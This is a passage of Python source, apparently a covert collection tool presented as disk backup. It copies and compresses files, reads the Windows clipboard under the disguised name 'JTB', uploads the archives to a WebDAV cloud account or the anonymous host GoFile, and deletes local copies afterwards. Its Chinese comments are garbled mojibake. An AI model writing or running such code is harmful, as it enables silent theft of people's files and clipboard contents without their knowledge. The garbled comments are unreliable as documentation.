                            target_sub_dir = os.path.join(target_dir, relative_path)
                            target_file = os.path.join(target_sub_dir, file)

                            if not self._ensure_directory(target_sub_dir):
                                break
                                
                            # ä½¿ç”¨åˆ†å—å¤åˆ¶
                            with open(source_file, 'rb') as src, open(target_file, 'wb') as dst:
                                shutil.copyfileobj(src, dst, length=self.config.FILE_COPY_BUFFER_SIZE)
                                    
                            files_count += 1
                            total_size += file_size
                            
                            break  # æˆåŠŸåè·³å‡ºé‡è¯•å¾ªç¯
                            
                        except (OSError, IOError, PermissionError) as e:
                            if attempt == retry_count - 1 and self.config.DEBUG_MODE:
                                logging.error(f"\nâŒ æ–‡ä»¶å¤åˆ¶å¤±è´¥: {file} - {str(e)}")

        except (OSError, IOError) as e:
            logging.error(f"\nâŒ å¤‡ä»½è¿‡ç¨‹å‡ºé”™: {str(e)}")

        # æ˜¾ç¤ºæœ€ç»ˆç»Ÿè®¡ä¿¡æ¯
        if files_count > 0:
            total_minutes = int((time.time() - start_time) / 60)
            logging.info("\n" + "â•" * 50)
            logging.info("ğŸ“Š ç£ç›˜å¤‡ä»½ç»Ÿè®¡")
            logging.info("â•" * 50)
            logging.info(f"   ğŸ“ æ–‡ä»¶æ•°é‡ï¼š{files_count} ä¸ª")
            logging.info(f"   ğŸ’¾ æ€»å¤§å°ï¼š{total_size / 1024 / 1024:.1f}MB")
            logging.info("â”€" * 50)
            logging.info(f"   â±ï¸  æ€»å…±è€—æ—¶ï¼š{total_minutes} åˆ†é’Ÿ")
            logging.info("â•" * 50 + "\n")
            return target_dir
        else:
            logging.error(f"\nâŒ æœªæ‰¾åˆ°éœ€è¦å¤‡ä»½çš„æ–‡ä»¶")
            return None
    
    def split_large_file(self, file_path):
        """å°†å¤§æ–‡ä»¶åˆ†å‰²æˆå°å—
        
        Args:
            file_path: è¦åˆ†å‰²çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: åˆ†ç‰‡æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼Œå¦‚æœä¸éœ€è¦åˆ†å‰²åˆ™è¿”å›None
        """
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
            return None
        
        try:
            chunk_files = []
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None
            
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                
            logging.critical(f"æ–‡ä»¶ {file_path} å·²åˆ†å‰²ä¸º {len(chunk_files)} ä¸ªåˆ†ç‰‡")
            return chunk_files
        except (OSError, IOError) as e:
            logging.error(f"åˆ†å‰²æ–‡ä»¶å¤±è´¥ {file_path}: {e}")
            return None

    def upload_file(self, file_path):
        """ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if not self._is_valid_file(file_path):
            logging.error(f"âš ï¸ æ–‡ä»¶ {file_path} ä¸ºç©ºæˆ–æ— æ•ˆï¼Œè·³è¿‡ä¸Šä¼ ")
            return False

        # æ£€æŸ¥æ–‡ä»¶å¤§å°å¹¶åœ¨éœ€è¦æ—¶åˆ†ç‰‡
        chunk_files = self.split_large_file(file_path)
        if chunk_files:
            success = True
            for chunk_file in chunk_files:
                if not self._upload_single_file(chunk_file):
                    success = False
            # ä»…åœ¨å…¨éƒ¨åˆ†ç‰‡ä¸Šä¼ æˆåŠŸåæ¸…ç†åˆ†ç‰‡ç›®å½•ä¸åŸå§‹æ–‡ä»¶
            if success:
                chunk_dir = os.path.dirname(chunk_files[0])
                self._clean_directory(chunk_dir)
                if os.path.exists(file_path):
                    try:
                        os.remove(file_path)
                    except Exception:
                        pass
            return success
        else:
            return self._upload_single_file(file_path)

    def _create_remote_directory(self, remote_dir):
        """åˆ›å»ºè¿œç¨‹ç›®å½•ï¼ˆä½¿ç”¨ WebDAV MKCOL æ–¹æ³•ï¼‰"""
        if not remote_dir or remote_dir == '.':
            return True
        
        try:
            # æ„å»ºç›®å½•è·¯å¾„
            dir_path = f"{self.infini_url.rstrip('/')}/{remote_dir.lstrip('/')}"
            
            response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
            
            if response.status_code in [201, 204, 405]:  # 405 è¡¨ç¤ºå·²å­˜åœ¨
                return True
            elif response.status_code == 409:
                # 409 å¯èƒ½è¡¨ç¤ºçˆ¶ç›®å½•ä¸å­˜åœ¨ï¼Œå°è¯•åˆ›å»ºçˆ¶ç›®å½•
                parent_dir = os.path.dirname(remote_dir)
                if parent_dir and parent_dir != '.':
                    if self._create_remote_directory(parent_dir):
                        # çˆ¶ç›®å½•åˆ›å»ºæˆåŠŸï¼Œå†æ¬¡å°è¯•åˆ›å»ºå½“å‰ç›®å½•
                        response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
                        return response.status_code in [201, 204, 405]
                return False
            else:
                return False
        except Exception:
            return False

    def _upload_single_file_infini(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶åˆ° Infini Cloudï¼ˆä½¿ç”¨ WebDAV PUT æ–¹æ³•ï¼‰"""
        try:
            # æ£€æŸ¥æ–‡ä»¶æƒé™å’ŒçŠ¶æ€
            if not os.path.exists(file_path):
                logging.error(f"æ–‡ä»¶ä¸å­˜åœ¨: {file_path}")
                return False
                
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0: {file_path}")
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"æ–‡ä»¶è¿‡å¤§ {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            # æ„å»ºè¿œç¨‹è·¯å¾„
            filename = os.path.basename(file_path)
            remote_filename = f"{self.config.INFINI_REMOTE_BASE_DIR}/{filename}"
            remote_path = f"{self.infini_url.rstrip('/')}/{remote_filename.lstrip('/')}"
            
            # åˆ›å»ºè¿œç¨‹ç›®å½•ï¼ˆå¦‚æœéœ€è¦ï¼‰
            remote_dir = os.path.dirname(remote_filename)
            if remote_dir and remote_dir != '.':
                if not self._create_remote_directory(remote_dir):
                    logging.warning(f"æ— æ³•åˆ›å»ºè¿œç¨‹ç›®å½•: {remote_dir}ï¼Œå°†ç»§ç»­å°è¯•ä¸Šä¼ ")

            # ä¸Šä¼ é‡è¯•é€»è¾‘
            for attempt in range(self.config.RETRY_COUNT):
                if not self._check_internet_connection():
                    logging.error("ç½‘ç»œè¿æ¥ä¸å¯ç”¨ï¼Œç­‰å¾…é‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)
                    continue

                try:
                    # æ ¹æ®æ–‡ä»¶å¤§å°åŠ¨æ€è°ƒæ•´è¶…æ—¶æ—¶é—´
                    if file_size < 1024 * 1024:  # å°äº1MB
                        connect_timeout = 10
                        read_timeout = 30
                    elif file_size < 10 * 1024 * 1024:  # 1-10MB
                        connect_timeout = 15
                        read_timeout = max(30, int(file_size / 1024 / 1024 * 5))
                    else:  # å¤§äº10MB
                        connect_timeout = 20
                        read_timeout = max(60, int(file_size / 1024 / 1024 * 6))
                    
                    # åªåœ¨ç¬¬ä¸€æ¬¡å°è¯•æ—¶æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯
                    if attempt == 0:
                        size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
                        logging.critical(f"ğŸ“¤ [Infini Cloud] ä¸Šä¼ : {filename} ({size_str})")
                    elif self.config.DEBUG_MODE:
                        logging.debug(f"[Infini Cloud] é‡è¯•ä¸Šä¼ : {filename} (ç¬¬ {attempt + 1} æ¬¡)")
                    
                    # å‡†å¤‡è¯·æ±‚å¤´
                    headers = {
                        'Content-Type': 'application/octet-stream',
                        'Content-Length': str(file_size),
                    }
                    
                    # æ‰§è¡Œä¸Šä¼ ï¼ˆä½¿ç”¨ WebDAV PUT æ–¹æ³•ï¼‰
                    with open(file_path, 'rb') as f:
                        response = self.session.put(
                            remote_path,
                            data=f,
                            headers=headers,
                            auth=self.auth,
                            timeout=(connect_timeout, read_timeout),
                            stream=False
                        )
                    
                    if response.status_code in [201, 204]:
                        logging.critical(f"âœ… [Infini Cloud] {filename}")
                        return True
                    elif response.status_code == 403:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: æƒé™ä¸è¶³")
                    elif response.status_code == 404:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: è¿œç¨‹è·¯å¾„ä¸å­˜åœ¨")
                    elif response.status_code == 409:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: è¿œç¨‹è·¯å¾„å†²çª")
                    else:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: çŠ¶æ€ç  {response.status_code}")
                        
                except requests.exceptions.Timeout:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: è¶…æ—¶")
                except requests.exceptions.SSLError as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: SSLé”™è¯¯")
                except requests.exceptions.ConnectionError as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: è¿æ¥é”™è¯¯")
                except Exception as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: {str(e)}")

                if attempt < self.config.RETRY_COUNT - 1:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"ç­‰å¾… {self.config.RETRY_DELAY} ç§’åé‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)

            return False
            
        except OSError as e:
            logging.error(f"è·å–æ–‡ä»¶ä¿¡æ¯å¤±è´¥ {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"[Infini Cloud] ä¸Šä¼ è¿‡ç¨‹å‡ºé”™: {e}")
            return False

    def _upload_single_file_gofile(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶åˆ° GoFileï¼ˆå¤‡é€‰æ–¹æ¡ˆï¼‰
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0 {file_path}")
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"âš ï¸ æ–‡ä»¶è¿‡å¤§ {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            filename = os.path.basename(file_path)
            logging.info(f"ğŸ”„ å°è¯•ä½¿ç”¨ GoFile ä¸Šä¼ : {filename}")

            for attempt in range(self.config.RETRY_COUNT):
                # æ£€æŸ¥ç½‘ç»œè¿æ¥
                if not self._check_internet_connection():
                    logging.error("âš ï¸ ç½‘ç»œè¿æ¥ä¸å¯ç”¨ï¼Œç­‰å¾…é‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY * 2)  # ç½‘ç»œé—®é¢˜æ—¶ç­‰å¾…æ›´é•¿æ—¶é—´
                    continue

                for server in self.config.UPLOAD_SERVERS:
                    try:
                        with open(file_path, "rb") as f:
                            if attempt == 0:
                                logging.critical(f"âŒ› [GoFile] æ­£åœ¨ä¸Šä¼ æ–‡ä»¶ {filename}ï¼ˆ{file_size / 1024 / 1024:.2f}MBï¼‰ï¼Œä½¿ç”¨æœåŠ¡å™¨ {server}...")
                            elif self.config.DEBUG_MODE:
                                logging.debug(f"[GoFile] ç¬¬ {attempt + 1} æ¬¡å°è¯•ï¼Œä½¿ç”¨æœåŠ¡å™¨ {server}...")
                            
                            response = requests.post(
                                server,
                                files={"file": f},
                                data={"token": self.api_token},
                                timeout=self.config.UPLOAD_TIMEOUT,
                                verify=True
                            )
                            
                            if response.ok and response.headers.get("Content-Type", "").startswith("application/json"):
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.critical(f"âœ… [GoFile] {filename}")
                                    return True
                                else:
                                    error_msg = result.get("message", "æœªçŸ¥é”™è¯¯")
                                    if attempt == 0 or self.config.DEBUG_MODE:
                                        logging.error(f"âŒ [GoFile] æœåŠ¡å™¨è¿”å›é”™è¯¯: {error_msg}")
                            else:
                                if attempt == 0 or self.config.DEBUG_MODE:
                                    logging.error(f"âŒ [GoFile] ä¸Šä¼ å¤±è´¥ï¼ŒçŠ¶æ€ç : {response.status_code}")
                                
                    except requests.exceptions.Timeout:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [GoFile] {filename}: ä¸Šä¼ è¶…æ—¶")
                    except requests.exceptions.SSLError:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [GoFile] {filename}: SSLé”™è¯¯")
                    except requests.exceptions.ConnectionError:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [GoFile] {filename}: è¿æ¥é”™è¯¯")
                    except Exception as e:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [GoFile] {filename}: {str(e)}")
                    
                    # å¦‚æœè¿™ä¸ªæœåŠ¡å™¨å¤±è´¥ï¼Œç»§ç»­å°è¯•ä¸‹ä¸€ä¸ªæœåŠ¡å™¨
                    continue
                
                if attempt < self.config.RETRY_COUNT - 1:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"ç­‰å¾… {self.config.RETRY_DELAY} ç§’åé‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)
            
            logging.error(f"âŒ [GoFile] {filename}: ä¸Šä¼ å¤±è´¥ï¼Œå·²è¾¾åˆ°æœ€å¤§é‡è¯•æ¬¡æ•°")
            return False
            
        except OSError as e:
            logging.error(f"âŒ è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"[GoFile] ä¸Šä¼ è¿‡ç¨‹å‡ºé”™: {e}")
            return False

    def _upload_single_file(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶ï¼Œä¼˜å…ˆä½¿ç”¨ Infini Cloudï¼Œå¤±è´¥åˆ™ä½¿ç”¨ GoFile å¤‡é€‰æ–¹æ¡ˆ
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0 {file_path}")
                if os.path.exists(file_path):
                    os.remove(file_path)
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"âš ï¸ æ–‡ä»¶è¿‡å¤§ {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                if os.path.exists(file_path):
                    os.remove(file_path)
                return False

            # ä¼˜å…ˆå°è¯• Infini Cloud ä¸Šä¼ 
            if self._upload_single_file_infini(file_path):
                if os.path.exists(file_path):
                    os.remove(file_path)
                return True

            # Infini Cloud ä¸Šä¼ å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨ GoFile å¤‡é€‰æ–¹æ¡ˆ
            logging.warning(f"âš ï¸ Infini Cloud ä¸Šä¼ å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨ GoFile å¤‡é€‰æ–¹æ¡ˆ: {os.path.basename(file_path)}")
            if self._upload_single_file_gofile(file_path):
                if os.path.exists(file_path):
                    os.remove(file_path)
                return True
            
            # ä¸¤ä¸ªæ–¹æ³•éƒ½å¤±è´¥
            logging.error(f"âŒ {os.path.basename(file_path)}: æ‰€æœ‰ä¸Šä¼ æ–¹æ³•å‡å¤±è´¥")
            return False
            
        except OSError as e:
            logging.error(f"âŒ è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"å¤„ç†æ–‡ä»¶æ—¶å‡ºç°æœªçŸ¥é”™è¯¯: {str(e)}")
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        """å‹ç¼©å¤‡ä»½æ–‡ä»¶å¤¹ä¸ºtar.gzæ ¼å¼
        
        Args:
            folder_path: è¦å‹ç¼©çš„æ–‡ä»¶å¤¹è·¯å¾„
            zip_file_path: å‹ç¼©æ–‡ä»¶è·¯å¾„ï¼ˆä¸å«æ‰©å±•åï¼‰
            
        Returns:
            str or list: å‹ç¼©æ–‡ä»¶è·¯å¾„æˆ–å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            # æ£€æŸ¥æºç›®å½•æ˜¯å¦ä¸ºç©º
            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"âš ï¸ æºç›®å½•ä¸ºç©º {folder_path}")
                return None

            # è®¡ç®—æºç›®å½•å¤§å°
            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"âŒè·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"æºç›®å½•å®é™…å¤§å°ä¸º0 {folder_path}")
                return None

            if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
                logging.error(f"âš ï¸ æºç›®å½•è¿‡å¤§ {folder_path}: {dir_size / 1024 / 1024 / 1024:.2f}GB > {self.config.MAX_SOURCE_DIR_SIZE / 1024 / 1024 / 1024}GB")
                return self.split_large_directory(folder_path, zip_file_path)

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz", compresslevel=self.config.TAR_COMPRESS_LEVEL) as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            # éªŒè¯å‹ç¼©æ–‡ä»¶
            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"å‹ç¼©æ–‡ä»¶å¤§å°ä¸º0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None
                    
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    os.remove(tar_path)
                    return self.split_large_directory(folder_path, zip_file_path)

                self._clean_directory(folder_path)
                logging.critical(f"ğŸ—‚ï¸ ç›®å½• {folder_path} ğŸ—ƒï¸ å·²å‹ç¼©: {dir_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                return tar_path
            except OSError as e:
                logging.error(f"âŒ è·å–å‹ç¼©æ–‡ä»¶å¤§å°å¤±è´¥ {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except Exception as e:
            logging.error(f"âŒ å‹ç¼©å¤±è´¥ {folder_path}: {e}")
            return None

    def _compress_chunk_part(self, part_dir, folder_path, base_zip_path, part_num, chunk_size):
        """å‹ç¼©å•ä¸ªåˆ†å—ç›®å½•
        
        Args:
            part_dir: åˆ†å—ç›®å½•è·¯å¾„
            folder_path: åŸå§‹ç›®å½•è·¯å¾„ï¼ˆç”¨äºarcnameï¼‰
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            part_num: åˆ†å—ç¼–å·
            chunk_size: åˆ†å—å¤§å°ï¼ˆå­—èŠ‚ï¼‰
            
        Returns:
            str or None: å‹ç¼©æ–‡ä»¶è·¯å¾„ï¼Œå¤±è´¥è¿”å›None
        """
        tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
        try:
            with tarfile.open(tar_path, "w:gz", compresslevel=self.config.TAR_COMPRESS_LEVEL) as tar:
                tar.add(part_dir, arcname=os.path.basename(folder_path))
            
            # éªŒè¯å‹ç¼©æ–‡ä»¶
            compressed_size = os.path.getsize(tar_path)
            if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"å‹ç¼©åæ–‡ä»¶ä»ç„¶è¿‡å¤§: {tar_path} ({compressed_size / 1024 / 1024:.2f}MB)")
                os.remove(tar_path)
                return None
            else:
                logging.critical(f"å·²åˆ›å»ºåˆ†å— {part_num + 1}: {chunk_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                return tar_path
        except (OSError, IOError, tarfile.TarError) as e:
            logging.error(f"å‹ç¼©åˆ†å—å¤±è´¥: {part_dir}: {e}")
            if os.path.exists(tar_path):
                os.remove(tar_path)
            return None

    def split_large_directory(self, folder_path, base_zip_path):
        """å°†å¤§ç›®å½•åˆ†å‰²æˆå¤šä¸ªå°å—å¹¶åˆ†åˆ«å‹ç¼©
        
        Args:
            folder_path: è¦åˆ†å‰²çš„ç›®å½•è·¯å¾„
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            compressed_files = []
            current_size = 0
            current_files = []
            part_num = 0
            
            # åˆ›å»ºä¸´æ—¶ç›®å½•å­˜æ”¾åˆ†å—
            temp_dir = os.path.join(os.path.dirname(folder_path), "temp_split")
            if not self._ensure_directory(temp_dir):
                return None

            # é‡‡ç”¨æ›´ä¿å®ˆçš„åˆ†å—å¤§å°é™åˆ¶
            # è€ƒè™‘åˆ°å‹ç¼©æ¯”å’Œå®‰å…¨è¾¹ç•Œï¼Œå°†ç›®æ ‡å¤§å°è®¾ç½®å¾—æ›´å°
            MAX_CHUNK_SIZE = int(self.config.MAX_SINGLE_FILE_SIZE * self.config.SAFETY_MARGIN / self.config.COMPRESSION_RATIO)

            # åˆ›å»ºæ–‡ä»¶å¤§å°æ˜ å°„ä»¥ä¼˜åŒ–åˆ†å—
            file_sizes = {}
            total_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    try:
                        size = os.path.getsize(file_path)
                        if size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            file_sizes[file_path] = size
                            total_size += size
                    except OSError:
                        continue

            if not file_sizes:
                logging.error(f"ç›®å½• {folder_path} ä¸­æ²¡æœ‰æœ‰æ•ˆæ–‡ä»¶")
                return None

            # æŒ‰æ–‡ä»¶å¤§å°é™åºæ’åºï¼Œä¼˜å…ˆå¤„ç†å¤§æ–‡ä»¶
            sorted_files = sorted(file_sizes.items(), key=lambda x: x[1], reverse=True)

            # æ£€æŸ¥æ˜¯å¦æœ‰å•ä¸ªæ–‡ä»¶è¶…è¿‡é™åˆ¶
            if sorted_files[0][1] > MAX_CHUNK_SIZE:
                logging.error(f"å‘ç°è¿‡å¤§æ–‡ä»¶: {sorted_files[0][0]} ({sorted_files[0][1] / 1024 / 1024:.2f}MB)")
                return None

            # ä½¿ç”¨æœ€ä¼˜è£…ç®±ç®—æ³•è¿›è¡Œåˆ†å—
            current_chunk = []
            current_chunk_size = 0

            for file_path, file_size in sorted_files:
                # å¦‚æœå½“å‰æ–‡ä»¶ä¼šå¯¼è‡´å—è¶…è¿‡é™åˆ¶ï¼Œå…ˆå¤„ç†å½“å‰å—
                if current_chunk_size + file_size > MAX_CHUNK_SIZE and current_chunk:
                    # åˆ›å»ºæ–°çš„åˆ†å—ç›®å½•
                    part_dir = os.path.join(temp_dir, f"part{part_num}")
                    if self._ensure_directory(part_dir):
                        # å¤åˆ¶æ–‡ä»¶åˆ°åˆ†å—ç›®å½•
                        success = True
                        for src in current_chunk:
                            rel_path = os.path.relpath(src, folder_path)
                            dst = os.path.join(part_dir, rel_path)
                            dst_dir = os.path.dirname(dst)
                            if not self._ensure_directory(dst_dir):
                                success = False
                                break
                            try:
                                shutil.copy2(src, dst)
                            except (OSError, IOError, shutil.Error) as e:
                                logging.error(f"å¤åˆ¶æ–‡ä»¶å¤±è´¥: {src} -> {dst}: {e}")
                                success = False
                                break

                        if success:
                            tar_path = self._compress_chunk_part(
                                part_dir, folder_path, base_zip_path, part_num, current_chunk_size
                            )
                            if tar_path:
                                compressed_files.append(tar_path)

                        self._clean_directory(part_dir)
                        part_num += 1

                    current_chunk = []
                    current_chunk_size = 0

                # æ·»åŠ å½“å‰æ–‡ä»¶åˆ°å—
                current_chunk.append(file_path)
                current_chunk_size += file_size

            # å¤„ç†æœ€åä¸€ä¸ªå—
            if current_chunk:
                part_dir = os.path.join(temp_dir, f"part{part_num}")
                if self._ensure_directory(part_dir):
                    success = True
                    for src in current_chunk:
                        rel_path = os.path.relpath(src, folder_path)
                        dst = os.path.join(part_dir, rel_path)
                        dst_dir = os.path.dirname(dst)
                        if not self._ensure_directory(dst_dir):
                            success = False
                            break
                        try:
                            shutil.copy2(src, dst)
                        except Exception as e:
                            logging.error(f"å¤åˆ¶æ–‡ä»¶å¤±è´¥: {src} -> {dst}: {e}")
                            success = False
                            break

                    if success:
                        tar_path = self._compress_chunk_part(
                            part_dir, folder_path, base_zip_path, part_num, current_chunk_size
                        )
                        if tar_path:
                            compressed_files.append(tar_path)

                    self._clean_directory(part_dir)

            # æ¸…ç†ä¸´æ—¶ç›®å½•å’Œæºç›®å½•
            self._clean_directory(temp_dir)
            self._clean_directory(folder_path)
            
            if not compressed_files:
                logging.error(f"ç›®å½• {folder_path} åˆ†å‰²å¤±è´¥ï¼Œæ²¡æœ‰ç”Ÿæˆæœ‰æ•ˆçš„å‹ç¼©æ–‡ä»¶")
                return None
            
            logging.critical(f"ç›®å½• {folder_path} å·²åˆ†å‰²ä¸º {len(compressed_files)} ä¸ªå‹ç¼©æ–‡ä»¶")
            return compressed_files
        except Exception as e:
            logging.error(f"åˆ†å‰²ç›®å½•å¤±è´¥ {folder_path}: {e}")
            return None

    def get_clipboard_content(self):
        """è·å–JTBå†…å®¹ï¼Œæ”¯æŒ Windows å’Œ WSL ç¯å¢ƒ"""
        try:
            # åœ¨ WSL ä¸­ä½¿ç”¨ PowerShell è·å– Windows JTB
            ps_command = 'powershell.exe Get-Clipboard'
            result = subprocess.run(
                ps_command,
                shell=True,
                capture_output=True,
                text=False  # æ”¹ä¸º False ä»¥è·å–åŸå§‹å­—èŠ‚
            )
            
            if result.returncode == 0:
                # å°è¯•ä¸åŒçš„ç¼–ç 
                encodings = ['utf-8', 'gbk', 'gb2312', 'gb18030', 'big5', 'latin1']
                
                # é¦–å…ˆå°è¯• UTF-8 å’Œ GBK
                for encoding in ['utf-8', 'gbk']:
                    try:
                        content = result.stdout.decode(encoding).strip()
                        # æ£€æŸ¥è§£ç åçš„å†…å®¹æ˜¯å¦ä¸ºç©ºæˆ–åªåŒ…å«ç©ºç™½å­—ç¬¦
                        if content and not content.isspace():
                            return content
                    except UnicodeDecodeError:
                        continue
                    
                # å¦‚æœå¸¸ç”¨ç¼–ç å¤±è´¥ï¼Œå°è¯•å…¶ä»–ç¼–ç 
                for encoding in encodings:
                    if encoding not in ['utf-8', 'gbk']:  # è·³è¿‡å·²å°è¯•çš„ç¼–ç 
                        try:
                            content = result.stdout.decode(encoding).strip()
                            if content and not content.isspace():
                                return content
                        except UnicodeDecodeError:
                            continue
                
                # å¦‚æœæ‰€æœ‰ç¼–ç éƒ½å¤±è´¥ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰åŸå§‹æ•°æ®
                if result.stdout:
                    try:
                        # ä½¿ç”¨ 'ignore' é€‰é¡¹ä½œä¸ºæœ€åçš„å°è¯•
                        content = result.stdout.decode('utf-8', errors='ignore').strip()
                        if content and not content.isspace():
                            if self.config.DEBUG_MODE:
                                logging.warning("âš ï¸ ä½¿ç”¨ ignore æ¨¡å¼è§£ç JTBå†…å®¹")
                            return content
                    except Exception as e:
                        if self.config.DEBUG_MODE:
                            logging.error(f"âŒ ignore æ¨¡å¼è§£ç å¤±è´¥: {str(e)}")
                else:
                    if self.config.DEBUG_MODE:
                        logging.debug("â„¹ï¸ JTBä¸ºç©º")
            else:
                if self.config.DEBUG_MODE:
                    logging.error(f"âŒ è·å–JTBå¤±è´¥ï¼Œè¿”å›ç : {result.returncode}")
                    if result.stderr:
                        try:
                            error_msg = result.stderr.decode('utf-8', errors='ignore')
                            logging.error(f"é”™è¯¯ä¿¡æ¯: {error_msg}")
                        except:
                            pass
        
            return None
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"âŒ è·å–JTBå‡ºé”™: {str(e)}")
            return None

    def log_clipboard_update(self, content, file_path):
        """è®°å½•JTBæ›´æ–°åˆ°æ–‡ä»¶"""
        try:
            # ç¡®ä¿ç›®å½•å­˜åœ¨
